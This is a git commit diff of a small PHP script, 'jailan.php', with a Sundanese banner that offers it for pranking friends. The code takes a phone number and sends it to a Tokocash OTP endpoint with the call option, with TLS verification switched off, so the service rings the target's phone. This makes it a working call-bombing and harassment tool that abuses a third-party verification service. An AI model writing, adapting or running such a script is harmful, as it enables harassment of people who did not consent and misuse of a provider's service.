fffa34e4ffb6e24ba34252234d00002b67f077f7
Sandi-Sc <57841533+Sandi-Sc@users.noreply.github.com>
2019-11-17 02:18:46 +0700

    Update jailan.php

--- jailan.php
+++ jailan.php
@@ -1,16 +1,17 @@
 <?php
 // Limit 3x Telpon Setiap Satu Nomor
-function send($phone){                                                         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/>
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_HEADER, true);
         curl_setopt($ch, CURLOPT_POST, 1);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=cal>
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
         curl_close($ch);
                 echo $asw."\n\n";
 }
-echo "Lamun Keur Bosen Euweuh Pagawean Ulah Hulang Huleng Siga Embe Ju>
+echo "Lamun Keur Bosen Euweuh Pagawean Ulah Hulang Huleng Siga Embe Jualeun Ming G ngajailan babaturan Nu keur Maen Game Telpon Ku Cara Make Script Ieu Nu Dijieun Ku\n\n";
 echo "                             SANDI PIRMANSYAH\n\n";
 echo "Jailan Babaturan Salagi Bisa\nInput : ";
 $nomor = trim(fgets(STDIN));
